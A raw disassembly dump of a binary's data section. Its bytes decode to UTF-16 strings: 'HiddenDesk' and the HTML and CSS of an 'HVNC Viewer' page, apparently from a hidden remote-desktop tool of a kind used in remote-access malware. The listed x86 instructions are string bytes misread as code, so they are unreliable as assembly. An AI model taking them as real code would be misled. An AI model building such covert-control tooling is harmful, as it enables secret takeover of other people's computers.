  405d74:	00 15 69 00 6d 00    	add    %dl,0x6d0069
  405d7a:	61                   	popa
  405d7b:	00 67 00             	add    %ah,0x0(%edi)
  405d7e:	65 00 2f             	add    %ch,%gs:(%edi)
  405d81:	00 6a 00             	add    %ch,0x0(%edx)
  405d84:	70 00                	jo     0x405d86
  405d86:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  405d8a:	00 03                	add    %al,(%ebx)
  405d8c:	22 00                	and    (%eax),%al
  405d8e:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  405d94:	00 05 5c 00 22 00    	add    %al,0x22005c
  405d9a:	00 05 5c 00 6e 00    	add    %al,0x6e005c
  405da0:	00 05 5c 00 72 00    	add    %al,0x72005c
  405da6:	00 05 5c 00 74 00    	add    %al,0x74005c
  405dac:	00 05 5c 00 75 00    	add    %al,0x75005c
  405db2:	00 05 78 00 34 00    	add    %al,0x340078
  405db8:	00 15 48 00 69 00    	add    %dl,0x690048
  405dbe:	64 00 64 00 65       	add    %ah,%fs:0x65(%eax,%eax,1)
  405dc3:	00 6e 00             	add    %ch,0x0(%esi)
  405dc6:	44                   	inc    %esp
  405dc7:	00 65 00             	add    %ah,0x0(%ebp)
  405dca:	73 00                	jae    0x405dcc
  405dcc:	6b 00 00             	imul   $0x0,(%eax),%eax
  405dcf:	9d                   	popf
  405dd0:	3b 3c 00             	cmp    (%eax,%eax,1),%edi
  405dd3:	21 00                	and    %eax,(%eax)
  405dd5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  405dd9:	63 00                	arpl   %eax,(%eax)
  405ddb:	74 00                	je     0x405ddd
  405ddd:	79 00                	jns    0x405ddf
  405ddf:	70 00                	jo     0x405de1
  405de1:	65 00 20             	add    %ah,%gs:(%eax)
  405de4:	00 68 00             	add    %ch,0x0(%eax)
  405de7:	74 00                	je     0x405de9
  405de9:	6d                   	insl   (%dx),%es:(%edi)
  405dea:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  405dee:	00 0a                	add    %cl,(%edx)
  405df0:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405df3:	68 00 74 00 6d       	push   $0x6d007400
  405df8:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  405dfc:	00 0a                	add    %cl,(%edx)
  405dfe:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405e01:	68 00 65 00 61       	push   $0x61006500
  405e06:	00 64 00 3e          	add    %ah,0x3e(%eax,%eax,1)
  405e0a:	00 0a                	add    %cl,(%edx)
  405e0c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405e0f:	6d                   	insl   (%dx),%es:(%edi)
  405e10:	00 65 00             	add    %ah,0x0(%ebp)
  405e13:	74 00                	je     0x405e15
  405e15:	61                   	popa
  405e16:	00 20                	add    %ah,(%eax)
  405e18:	00 63 00             	add    %ah,0x0(%ebx)
  405e1b:	68 00 61 00 72       	push   $0x72006100
  405e20:	00 73 00             	add    %dh,0x0(%ebx)
  405e23:	65 00 74 00 3d       	add    %dh,%gs:0x3d(%eax,%eax,1)
  405e28:	00 27                	add    %ah,(%edi)
  405e2a:	00 75 00             	add    %dh,0x0(%ebp)
  405e2d:	74 00                	je     0x405e2f
  405e2f:	66 00 2d 00 38 00 27 	data16 add %ch,0x27003800
  405e36:	00 3e                	add    %bh,(%esi)
  405e38:	00 0a                	add    %cl,(%edx)
  405e3a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405e3d:	6d                   	insl   (%dx),%es:(%edi)
  405e3e:	00 65 00             	add    %ah,0x0(%ebp)
  405e41:	74 00                	je     0x405e43
  405e43:	61                   	popa
  405e44:	00 20                	add    %ah,(%eax)
  405e46:	00 6e 00             	add    %ch,0x0(%esi)
  405e49:	61                   	popa
  405e4a:	00 6d 00             	add    %ch,0x0(%ebp)
  405e4d:	65 00 3d 00 27 00 76 	add    %bh,%gs:0x76002700
  405e54:	00 69 00             	add    %ch,0x0(%ecx)
  405e57:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  405e5b:	70 00                	jo     0x405e5d
  405e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  405e5e:	00 72 00             	add    %dh,0x0(%edx)
  405e61:	74 00                	je     0x405e63
  405e63:	27                   	daa
  405e64:	00 20                	add    %ah,(%eax)
  405e66:	00 63 00             	add    %ah,0x0(%ebx)
  405e69:	6f                   	outsl  %ds:(%esi),(%dx)
  405e6a:	00 6e 00             	add    %ch,0x0(%esi)
  405e6d:	74 00                	je     0x405e6f
  405e6f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405e73:	74 00                	je     0x405e75
  405e75:	3d 00 27 00 77       	cmp    $0x77002700,%eax
  405e7a:	00 69 00             	add    %ch,0x0(%ecx)
  405e7d:	64 00 74 00 68       	add    %dh,%fs:0x68(%eax,%eax,1)
  405e82:	00 3d 00 64 00 65    	add    %bh,0x65006400
  405e88:	00 76 00             	add    %dh,0x0(%esi)
  405e8b:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  405e91:	2d 00 77 00 69       	sub    $0x69007700,%eax
  405e96:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  405e9a:	00 68 00             	add    %ch,0x0(%eax)
  405e9d:	2c 00                	sub    $0x0,%al
  405e9f:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  405ea5:	74 00                	je     0x405ea7
  405ea7:	69 00 61 00 6c 00    	imul   $0x6c0061,(%eax),%eax
  405ead:	2d 00 73 00 63       	sub    $0x63007300,%eax
  405eb2:	00 61 00             	add    %ah,0x0(%ecx)
  405eb5:	6c                   	insb   (%dx),%es:(%edi)
  405eb6:	00 65 00             	add    %ah,0x0(%ebp)
  405eb9:	3d 00 31 00 27       	cmp    $0x27003100,%eax
  405ebe:	00 3e                	add    %bh,(%esi)
  405ec0:	00 0a                	add    %cl,(%edx)
  405ec2:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405ec5:	74 00                	je     0x405ec7
  405ec7:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  405ecd:	65 00 3e             	add    %bh,%gs:(%esi)
  405ed0:	00 48 00             	add    %cl,0x0(%eax)
  405ed3:	56                   	push   %esi
  405ed4:	00 4e 00             	add    %cl,0x0(%esi)
  405ed7:	43                   	inc    %ebx
  405ed8:	00 20                	add    %ah,(%eax)
  405eda:	00 56 00             	add    %dl,0x0(%esi)
  405edd:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  405ee3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405ee7:	3c 00                	cmp    $0x0,%al
  405ee9:	2f                   	das
  405eea:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  405eee:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  405ef2:	00 65 00             	add    %ah,0x0(%ebp)
  405ef5:	3e 00 0a             	add    %cl,%ds:(%edx)
  405ef8:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405efb:	73 00                	jae    0x405efd
  405efd:	74 00                	je     0x405eff
  405eff:	79 00                	jns    0x405f01
  405f01:	6c                   	insb   (%dx),%es:(%edi)
  405f02:	00 65 00             	add    %ah,0x0(%ebp)
  405f05:	3e 00 0a             	add    %cl,%ds:(%edx)
  405f08:	00 20                	add    %ah,(%eax)
  405f0a:	00 20                	add    %ah,(%eax)
  405f0c:	00 68 00             	add    %ch,0x0(%eax)
  405f0f:	74 00                	je     0x405f11
  405f11:	6d                   	insl   (%dx),%es:(%edi)
  405f12:	00 6c 00 2c          	add    %ch,0x2c(%eax,%eax,1)
  405f16:	00 62 00             	add    %ah,0x0(%edx)
  405f19:	6f                   	outsl  %ds:(%esi),(%dx)
  405f1a:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  405f1e:	00 7b 00             	add    %bh,0x0(%ebx)
  405f21:	68 00 65 00 69       	push   $0x69006500
  405f26:	00 67 00             	add    %ah,0x0(%edi)
  405f29:	68 00 74 00 3a       	push   $0x3a007400
  405f2e:	00 31                	add    %dh,(%ecx)
  405f30:	00 30                	add    %dh,(%eax)
  405f32:	00 30                	add    %dh,(%eax)
  405f34:	00 25 00 3b 00 6d    	add    %ah,0x6d003b00
  405f3a:	00 61 00             	add    %ah,0x0(%ecx)
  405f3d:	72 00                	jb     0x405f3f
  405f3f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  405f43:	6e                   	outsb  %ds:(%esi),(%dx)
  405f44:	00 3a                	add    %bh,(%edx)
  405f46:	00 30                	add    %dh,(%eax)
  405f48:	00 3b                	add    %bh,(%ebx)
  405f4a:	00 62 00             	add    %ah,0x0(%edx)
  405f4d:	61                   	popa
  405f4e:	00 63 00             	add    %ah,0x0(%ebx)
  405f51:	6b 00 67             	imul   $0x67,(%eax),%eax
  405f54:	00 72 00             	add    %dh,0x0(%edx)
  405f57:	6f                   	outsl  %ds:(%esi),(%dx)
  405f58:	00 75 00             	add    %dh,0x0(%ebp)
  405f5b:	6e                   	outsb  %ds:(%esi),(%dx)
  405f5c:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  405f60:	00 23                	add    %ah,(%ebx)
  405f62:	00 31                	add    %dh,(%ecx)
  405f64:	00 31                	add    %dh,(%ecx)
  405f66:	00 31                	add    %dh,(%ecx)
  405f68:	00 3b                	add    %bh,(%ebx)
  405f6a:	00 63 00             	add    %ah,0x0(%ebx)
  405f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  405f6e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  405f72:	00 72 00             	add    %dh,0x0(%edx)
  405f75:	3a 00                	cmp    (%eax),%al
  405f77:	23 00                	and    (%eax),%eax
  405f79:	64 00 64 00 64       	add    %ah,%fs:0x64(%eax,%eax,1)
  405f7e:	00 3b                	add    %bh,(%ebx)
  405f80:	00 66 00             	add    %ah,0x0(%esi)
  405f83:	6f                   	outsl  %ds:(%esi),(%dx)
  405f84:	00 6e 00             	add    %ch,0x0(%esi)
  405f87:	74 00                	je     0x405f89
  405f89:	2d 00 66 00 61       	sub    $0x61006600,%eax
  405f8e:	00 6d 00             	add    %ch,0x0(%ebp)
  405f91:	69 00 6c 00 79 00    	imul   $0x79006c,(%eax),%eax
  405f97:	3a 00                	cmp    (%eax),%al
  405f99:	53                   	push   %ebx
  405f9a:	00 65 00             	add    %ah,0x0(%ebp)
  405f9d:	67 00 6f 00          	add    %ch,0x0(%bx)
  405fa1:	65 00 20             	add    %ah,%gs:(%eax)
  405fa4:	00 55 00             	add    %dl,0x0(%ebp)
  405fa7:	49                   	dec    %ecx
  405fa8:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405fab:	41                   	inc    %ecx
  405fac:	00 72 00             	add    %dh,0x0(%edx)
  405faf:	69 00 61 00 6c 00    	imul   $0x6c0061,(%eax),%eax
  405fb5:	2c 00                	sub    $0x0,%al
  405fb7:	73 00                	jae    0x405fb9
  405fb9:	61                   	popa
  405fba:	00 6e 00             	add    %ch,0x0(%esi)
  405fbd:	73 00                	jae    0x405fbf
  405fbf:	2d 00 73 00 65       	sub    $0x65007300,%eax
  405fc4:	00 72 00             	add    %dh,0x0(%edx)
  405fc7:	69 00 66 00 3b 00    	imul   $0x3b0066,(%eax),%eax
  405fcd:	7d 00                	jge    0x405fcf
  405fcf:	0a 00                	or     (%eax),%al
  405fd1:	20 00                	and    %al,(%eax)
  405fd3:	20 00                	and    %al,(%eax)
  405fd5:	23 00                	and    (%eax),%eax
  405fd7:	74 00                	je     0x405fd9
  405fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  405fda:	00 70 00             	add    %dh,0x0(%eax)
  405fdd:	7b 00                	jnp    0x405fdf
  405fdf:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  405fe3:	73 00                	jae    0x405fe5
  405fe5:	70 00                	jo     0x405fe7
  405fe7:	6c                   	insb   (%dx),%es:(%edi)
  405fe8:	00 61 00             	add    %ah,0x0(%ecx)
  405feb:	79 00                	jns    0x405fed
  405fed:	3a 00                	cmp    (%eax),%al
  405fef:	66 00 6c 00 65       	data16 add %ch,0x65(%eax,%eax,1)
  405ff4:	00 78 00             	add    %bh,0x0(%eax)
  405ff7:	3b 00                	cmp    (%eax),%eax
  405ff9:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  405ffd:	70 00                	jo     0x405fff
  405fff:	3a 00                	cmp    (%eax),%al
  406001:	31 00                	xor    %eax,(%eax)
  406003:	34 00                	xor    $0x0,%al
  406005:	70 00                	jo     0x406007
  406007:	78 00                	js     0x406009
  406009:	3b 00                	cmp    (%eax),%eax
  40600b:	61                   	popa
  40600c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  406010:	00 67 00             	add    %ah,0x0(%edi)
  406013:	6e                   	outsb  %ds:(%esi),(%dx)
  406014:	00 2d 00 69 00 74    	add    %ch,0x74006900
  40601a:	00 65 00             	add    %ah,0x0(%ebp)
  40601d:	6d                   	insl   (%dx),%es:(%edi)
  40601e:	00 73 00             	add    %dh,0x0(%ebx)
  406021:	3a 00                	cmp    (%eax),%al
  406023:	63 00                	arpl   %eax,(%eax)
  406025:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406029:	74 00                	je     0x40602b
  40602b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40602f:	3b 00                	cmp    (%eax),%eax
  406031:	70 00                	jo     0x406033
  406033:	61                   	popa
  406034:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  406038:	00 69 00             	add    %ch,0x0(%ecx)
  40603b:	6e                   	outsb  %ds:(%esi),(%dx)
  40603c:	00 67 00             	add    %ah,0x0(%edi)
  40603f:	3a 00                	cmp    (%eax),%al
  406041:	31 00                	xor    %eax,(%eax)
  406043:	30 00                	xor    %al,(%eax)
  406045:	70 00                	jo     0x406047
  406047:	78 00                	js     0x406049
  406049:	20 00                	and    %al,(%eax)
  40604b:	31 00                	xor    %eax,(%eax)
  40604d:	32 00                	xor    (%eax),%al
  40604f:	70 00                	jo     0x406051
  406051:	78 00                	js     0x406053
  406053:	3b 00                	cmp    (%eax),%eax
  406055:	62 00                	bound  %eax,(%eax)
  406057:	61                   	popa
  406058:	00 63 00             	add    %ah,0x0(%ebx)
  40605b:	6b 00 67             	imul   $0x67,(%eax),%eax
  40605e:	00 72 00             	add    %dh,0x0(%edx)
  406061:	6f                   	outsl  %ds:(%esi),(%dx)
  406062:	00 75 00             	add    %dh,0x0(%ebp)
  406065:	6e                   	outsb  %ds:(%esi),(%dx)
  406066:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40606a:	00 23                	add    %ah,(%ebx)
  40606c:	00 31                	add    %dh,(%ecx)
  40606e:	00 61 00             	add    %ah,0x0(%ecx)
  406071:	31 00                	xor    %eax,(%eax)
  406073:	61                   	popa
  406074:	00 31                	add    %dh,(%ecx)
  406076:	00 61 00             	add    %ah,0x0(%ecx)
  406079:	3b 00                	cmp    (%eax),%eax
  40607b:	62 00                	bound  %eax,(%eax)
  40607d:	6f                   	outsl  %ds:(%esi),(%dx)
  40607e:	00 72 00             	add    %dh,0x0(%edx)
  406081:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406085:	72 00                	jb     0x406087
  406087:	2d 00 62 00 6f       	sub    $0x6f006200,%eax
  40608c:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  406090:	00 6f 00             	add    %ch,0x0(%edi)
  406093:	6d                   	insl   (%dx),%es:(%edi)
  406094:	00 3a                	add    %bh,(%edx)
  406096:	00 31                	add    %dh,(%ecx)
  406098:	00 70 00             	add    %dh,0x0(%eax)
  40609b:	78 00                	js     0x40609d
  40609d:	20 00                	and    %al,(%eax)
  40609f:	73 00                	jae    0x4060a1
  4060a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4060a2:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4060a6:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4060aa:	00 23                	add    %ah,(%ebx)
  4060ac:	00 33                	add    %dh,(%ebx)
  4060ae:	00 33                	add    %dh,(%ebx)
  4060b0:	00 33                	add    %dh,(%ebx)
  4060b2:	00 3b                	add    %bh,(%ebx)
  4060b4:	00 7d 00             	add    %bh,0x0(%ebp)
  4060b7:	0a 00                	or     (%eax),%al
  4060b9:	20 00                	and    %al,(%eax)
  4060bb:	20 00                	and    %al,(%eax)
  4060bd:	23 00                	and    (%eax),%eax
  4060bf:	73 00                	jae    0x4060c1
  4060c1:	74 00                	je     0x4060c3
  4060c3:	61                   	popa
  4060c4:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4060c8:	00 73 00             	add    %dh,0x0(%ebx)
  4060cb:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  4060cf:	6b 00 7b             	imul   $0x7b,(%eax),%eax
  4060d2:	00 63 00             	add    %ah,0x0(%ebx)
  4060d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4060d6:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4060da:	00 72 00             	add    %dh,0x0(%edx)
  4060dd:	3a 00                	cmp    (%eax),%al
  4060df:	23 00                	and    (%eax),%eax
  4060e1:	37                   	aaa
  4060e2:	00 43 00             	add    %al,0x0(%ebx)
  4060e5:	46                   	inc    %esi
  4060e6:	00 43 00             	add    %al,0x0(%ebx)
  4060e9:	38 00                	cmp    %al,(%eax)
  4060eb:	41                   	inc    %ecx
  4060ec:	00 7d 00             	add    %bh,0x0(%ebp)
  4060ef:	20 00                	and    %al,(%eax)
  4060f1:	23 00                	and    (%eax),%eax
  4060f3:	73 00                	jae    0x4060f5
  4060f5:	74 00                	je     0x4060f7
  4060f7:	61                   	popa
  4060f8:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4060fc:	00 73 00             	add    %dh,0x0(%ebx)
  4060ff:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406103:	61                   	popa
  406104:	00 64 00 7b          	add    %ah,0x7b(%eax,%eax,1)
  406108:	00 63 00             	add    %ah,0x0(%ebx)
  40610b:	6f                   	outsl  %ds:(%esi),(%dx)
  40610c:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  406110:	00 72 00             	add    %dh,0x0(%edx)
  406113:	3a 00                	cmp    (%eax),%al
  406115:	23 00                	and    (%eax),%eax
  406117:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40611b:	38 00                	cmp    %al,(%eax)
  40611d:	63 00                	arpl   %eax,(%eax)
  40611f:	38 00                	cmp    %al,(%eax)
  406121:	63 00                	arpl   %eax,(%eax)
  406123:	7d 00                	jge    0x406125
  406125:	0a 00                	or     (%eax),%al
  406127:	20 00                	and    %al,(%eax)
  406129:	20 00                	and    %al,(%eax)
  40612b:	23 00                	and    (%eax),%eax
  40612d:	77 00                	ja     0x40612f
  40612f:	72 00                	jb     0x406131
  406131:	61                   	popa
  406132:	00 70 00             	add    %dh,0x0(%eax)
  406135:	7b 00                	jnp    0x406137
  406137:	68 00 65 00 69       	push   $0x69006500
  40613c:	00 67 00             	add    %ah,0x0(%edi)
  40613f:	68 00 74 00 3a       	push   $0x3a007400
  406144:	00 63 00             	add    %ah,0x0(%ebx)
  406147:	61                   	popa
  406148:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40614c:	00 28                	add    %ch,(%eax)
  40614e:	00 31                	add    %dh,(%ecx)
  406150:	00 30                	add    %dh,(%eax)
  406152:	00 30                	add    %dh,(%eax)
  406154:	00 25 00 20 00 2d    	add    %ah,0x2d002000
  40615a:	00 20                	add    %ah,(%eax)
  40615c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40615f:	34 00                	xor    $0x0,%al
  406161:	70 00                	jo     0x406163
  406163:	78 00                	js     0x406165
  406165:	29 00                	sub    %eax,(%eax)
  406167:	3b 00                	cmp    (%eax),%eax
  406169:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40616d:	73 00                	jae    0x40616f
  40616f:	70 00                	jo     0x406171
  406171:	6c                   	insb   (%dx),%es:(%edi)
  406172:	00 61 00             	add    %ah,0x0(%ecx)
  406175:	79 00                	jns    0x406177
  406177:	3a 00                	cmp    (%eax),%al
  406179:	66 00 6c 00 65       	data16 add %ch,0x65(%eax,%eax,1)
  40617e:	00 78 00             	add    %bh,0x0(%eax)
  406181:	3b 00                	cmp    (%eax),%eax
  406183:	6a 00                	push   $0x0
  406185:	75 00                	jne    0x406187
  406187:	73 00                	jae    0x406189
  406189:	74 00                	je     0x40618b
  40618b:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  406191:	2d 00 63 00 6f       	sub    $0x6f006300,%eax
  406196:	00 6e 00             	add    %ch,0x0(%esi)
  406199:	74 00                	je     0x40619b
  40619b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40619f:	74 00                	je     0x4061a1
  4061a1:	3a 00                	cmp    (%eax),%al
  4061a3:	63 00                	arpl   %eax,(%eax)
  4061a5:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4061a9:	74 00                	je     0x4061ab
  4061ab:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4061af:	3b 00                	cmp    (%eax),%eax
  4061b1:	61                   	popa
  4061b2:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4061b6:	00 67 00             	add    %ah,0x0(%edi)
  4061b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4061ba:	00 2d 00 69 00 74    	add    %ch,0x74006900
  4061c0:	00 65 00             	add    %ah,0x0(%ebp)
  4061c3:	6d                   	insl   (%dx),%es:(%edi)
  4061c4:	00 73 00             	add    %dh,0x0(%ebx)
  4061c7:	3a 00                	cmp    (%eax),%al
  4061c9:	63 00                	arpl   %eax,(%eax)
  4061cb:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4061cf:	74 00                	je     0x4061d1
  4061d1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4061d5:	3b 00                	cmp    (%eax),%eax
  4061d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d8:	00 76 00             	add    %dh,0x0(%esi)
  4061db:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4061df:	66 00 6c 00 6f       	data16 add %ch,0x6f(%eax,%eax,1)
  4061e4:	00 77 00             	add    %dh,0x0(%edi)
  4061e7:	3a 00                	cmp    (%eax),%al
  4061e9:	61                   	popa
  4061ea:	00 75 00             	add    %dh,0x0(%ebp)
  4061ed:	74 00                	je     0x4061ef
  4061ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4061f0:	00 3b                	add    %bh,(%ebx)
  4061f2:	00 7d 00             	add    %bh,0x0(%ebp)
  4061f5:	0a 00                	or     (%eax),%al
  4061f7:	20 00                	and    %al,(%eax)
  4061f9:	20 00                	and    %al,(%eax)
  4061fb:	23 00                	and    (%eax),%eax
  4061fd:	76 00                	jbe    0x4061ff
  4061ff:	7b 00                	jnp    0x406201
  406201:	6d                   	insl   (%dx),%es:(%edi)
  406202:	00 61 00             	add    %ah,0x0(%ecx)
  406205:	78 00                	js     0x406207
  406207:	2d 00 77 00 69       	sub    $0x69007700,%eax
  40620c:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  406210:	00 68 00             	add    %ch,0x0(%eax)
  406213:	3a 00                	cmp    (%eax),%al
  406215:	31 00                	xor    %eax,(%eax)
  406217:	30 00                	xor    %al,(%eax)
  406219:	30 00                	xor    %al,(%eax)
  40621b:	25 00 3b 00 6d       	and    $0x6d003b00,%eax
  406220:	00 61 00             	add    %ah,0x0(%ecx)
  406223:	78 00                	js     0x406225
  406225:	2d 00 68 00 65       	sub    $0x65006800,%eax
  40622a:	00 69 00             	add    %ch,0x0(%ecx)
  40622d:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  406231:	74 00                	je     0x406233
  406233:	3a 00                	cmp    (%eax),%al
  406235:	31 00                	xor    %eax,(%eax)
  406237:	30 00                	xor    %al,(%eax)
  406239:	30 00                	xor    %al,(%eax)
  40623b:	25 00 3b 00 69       	and    $0x69003b00,%eax
  406240:	00 6d 00             	add    %ch,0x0(%ebp)
  406243:	61                   	popa
  406244:	00 67 00             	add    %ah,0x0(%edi)
  406247:	65 00 2d 00 72 00 65 	add    %ch,%gs:0x65007200
  40624e:	00 6e 00             	add    %ch,0x0(%esi)
  406251:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406255:	72 00                	jb     0x406257
  406257:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40625d:	3a 00                	cmp    (%eax),%al
  40625f:	61                   	popa
  406260:	00 75 00             	add    %dh,0x0(%ebp)
  406263:	74 00                	je     0x406265
  406265:	6f                   	outsl  %ds:(%esi),(%dx)
  406266:	00 3b                	add    %bh,(%ebx)
  406268:	00 6f 00             	add    %ch,0x0(%edi)
  40626b:	75 00                	jne    0x40626d
  40626d:	74 00                	je     0x40626f
  40626f:	6c                   	insb   (%dx),%es:(%edi)
  406270:	00 69 00             	add    %ch,0x0(%ecx)
  406273:	6e                   	outsb  %ds:(%esi),(%dx)
  406274:	00 65 00             	add    %ah,0x0(%ebp)
  406277:	3a 00                	cmp    (%eax),%al
  406279:	6e                   	outsb  %ds:(%esi),(%dx)
  40627a:	00 6f 00             	add    %ch,0x0(%edi)
  40627d:	6e                   	outsb  %ds:(%esi),(%dx)
  40627e:	00 65 00             	add    %ah,0x0(%ebp)
  406281:	3b 00                	cmp    (%eax),%eax
  406283:	63 00                	arpl   %eax,(%eax)
  406285:	75 00                	jne    0x406287
  406287:	72 00                	jb     0x406289
  406289:	73 00                	jae    0x40628b
  40628b:	6f                   	outsl  %ds:(%esi),(%dx)
  40628c:	00 72 00             	add    %dh,0x0(%edx)
  40628f:	3a 00                	cmp    (%eax),%al
  406291:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406295:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  406299:	75 00                	jne    0x40629b
  40629b:	6c                   	insb   (%dx),%es:(%edi)
  40629c:	00 74 00 3b          	add    %dh,0x3b(%eax,%eax,1)
  4062a0:	00 7d 00             	add    %bh,0x0(%ebp)
  4062a3:	0a 00                	or     (%eax),%al
  4062a5:	20 00                	and    %al,(%eax)
  4062a7:	20 00                	and    %al,(%eax)
  4062a9:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4062ad:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  4062b3:	7b 00                	jnp    0x4062b5
  4062b5:	62 00                	bound  %eax,(%eax)
  4062b7:	61                   	popa
  4062b8:	00 63 00             	add    %ah,0x0(%ebx)
  4062bb:	6b 00 67             	imul   $0x67,(%eax),%eax
  4062be:	00 72 00             	add    %dh,0x0(%edx)
  4062c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4062c2:	00 75 00             	add    %dh,0x0(%ebp)
  4062c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4062c6:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  4062ca:	00 23                	add    %ah,(%ebx)
  4062cc:	00 32                	add    %dh,(%edx)
  4062ce:	00 36                	add    %dh,(%esi)
  4062d0:	00 32                	add    %dh,(%edx)
  4062d2:	00 36                	add    %dh,(%esi)
  4062d4:	00 32                	add    %dh,(%edx)
  4062d6:	00 36                	add    %dh,(%esi)
  4062d8:	00 3b                	add    %bh,(%ebx)
  4062da:	00 70 00             	add    %dh,0x0(%eax)
  4062dd:	61                   	popa
  4062de:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  4062e2:	00 69 00             	add    %ch,0x0(%ecx)
  4062e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4062e6:	00 67 00             	add    %ah,0x0(%edi)
  4062e9:	3a 00                	cmp    (%eax),%al
  4062eb:	34 00                	xor    $0x0,%al
  4062ed:	70 00                	jo     0x4062ef
  4062ef:	78 00                	js     0x4062f1
  4062f1:	20 00                	and    %al,(%eax)
  4062f3:	38 00                	cmp    %al,(%eax)
  4062f5:	70 00                	jo     0x4062f7
  4062f7:	78 00                	js     0x4062f9
  4062f9:	3b 00                	cmp    (%eax),%eax
  4062fb:	62 00                	bound  %eax,(%eax)
  4062fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fe:	00 72 00             	add    %dh,0x0(%edx)
  406301:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406305:	72 00                	jb     0x406307
  406307:	2d 00 72 00 61       	sub    $0x61007200,%eax
  40630c:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  406310:	00 75 00             	add    %dh,0x0(%ebp)
  406313:	73 00                	jae    0x406315
  406315:	3a 00                	cmp    (%eax),%al
  406317:	39 00                	cmp    %eax,(%eax)
  406319:	39 00                	cmp    %eax,(%eax)
  40631b:	39 00                	cmp    %eax,(%eax)
  40631d:	70 00                	jo     0x40631f
  40631f:	78 00                	js     0x406321
  406321:	3b 00                	cmp    (%eax),%eax
  406323:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  406327:	6e                   	outsb  %ds:(%esi),(%dx)
  406328:	00 74 00 2d          	add    %dh,0x2d(%eax,%eax,1)
  40632c:	00 73 00             	add    %dh,0x0(%ebx)
  40632f:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  406335:	3a 00                	cmp    (%eax),%al
  406337:	31 00                	xor    %eax,(%eax)
  406339:	32 00                	xor    (%eax),%al
  40633b:	70 00                	jo     0x40633d
  40633d:	78 00                	js     0x40633f
  40633f:	3b 00                	cmp    (%eax),%eax
  406341:	7d 00                	jge    0x406343
  406343:	0a 00                	or     (%eax),%al
  406345:	3c 00                	cmp    $0x0,%al
  406347:	2f                   	das
